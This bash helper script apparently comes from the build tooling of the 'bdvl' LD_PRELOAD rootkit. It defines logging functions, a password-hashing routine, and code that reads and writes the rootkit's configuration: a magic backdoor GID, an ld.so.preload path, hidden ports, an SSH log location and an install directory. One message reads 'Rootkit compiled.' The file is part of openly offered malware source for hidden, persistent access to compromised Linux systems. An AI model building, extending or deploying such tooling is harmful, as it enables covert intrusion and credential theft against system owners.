script_root="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
default_depth=2 # default depth for getting random directory paths for stuff

bin_path(){ echo -n `which $1 2>/dev/null || echo -n "$(random 'a-z' 5)"`; }
lib_size(){ echo -n "Rootkit compiled. ($BDVLSO.$1 - `ls -lhN $BDVLSO.$1 | awk '{print $5}'`)"; }
read_cfg(){ cat $1 | grep -o '^[^#]*'; }

source $script_root/dialog.sh
wecho(){
    [ "$USE_DIALOG" == 0 ] || [ -z "$USE_DIALOG" ] && { \
        printf " \e[33m[!]\e[0m $1\n"; \
        return; \
    }
    show_msg "WARNING: $1"
}
eecho(){
    [ "$USE_DIALOG" == 0 ] || [ -z "$USE_DIALOG" ] && { \
        printf " \e[31m[!]\e[0m $1\n"; \
        return; \
    }
    show_msg "ERROR: $1"
}
secho(){
    [ "$USE_DIALOG" == 0 ] || [ -z "$USE_DIALOG" ] && { \
        printf " \e[32m[+]\e[0m $1\n"; \
        return; \
    }
    show_msg "$1"
}
necho(){
    [ "$USE_DIALOG" == 0 ] || [ -z "$USE_DIALOG" ] && { \
        printf " [..] $1\n"; \
        return; \
    }
    show_info "$1"
}
verbose(){
    [ -z $VERBOSE ] || [ $VERBOSE == 0 ] && return
    printf " \e[35m[++]\e[0m $1\n"
}

# if we can use python, use it. if not, try openssl.
# ./environ.sh will check which, if any, we can use for passwords.
crypt_password(){
    local salt="`random 'A-Za-z0-9' 16`";
    [ -f `bin_path python` ] && { \
        echo -n `python -c "import crypt; print(crypt.crypt(\"$1\", \"\\$6\\$$salt\"))"`; \
        return; \
    }
    [ -f `bin_path openssl` ] && { \
        echo -n "`openssl passwd -6 -salt $salt $1`"; \
        return; \
    }
    echo -n "bigfatfail" # ???
}


cleanup_bdvl() { necho "Cleaning up local mess"; rm -rf $NEW_MDIR *.so.*; }

# not very elegant at all. but here we go.
read_defaults(){ # $1 = path to write to
    local settings=(`read_cfg $1`)
    MAGIC_GID=${settings[0]}
    INSTALL_DIR=${settings[1]}
    LDSO_PRELOAD=${settings[2]}
    BDVLSO=${settings[3]}
    SOPATH=${settings[4]}
    HIDEPORTS=${settings[5]}
    SSH_LOGS=${settings[6]}
    INTEREST_DIR=${settings[7]}
    BD_VAR=${settings[8]}
    GID_PATH=${settings[9]}
    GIDTIME_PATH=${settings[10]}
}

write_defaults(){ # $1 = path to write to
    printf "# do not edit anything in this file!\n$MAGIC_GID\n$INSTALL_DIR\n$LDSO_PRELOAD\n$BDVLSO\n\
$SOPATH\n$HIDEPORTS\n$SSH_LOGS\n$INTEREST_DIR\n\
$BD_VAR\n$GID_PATH\n$GIDTIME_PATH" > $1
}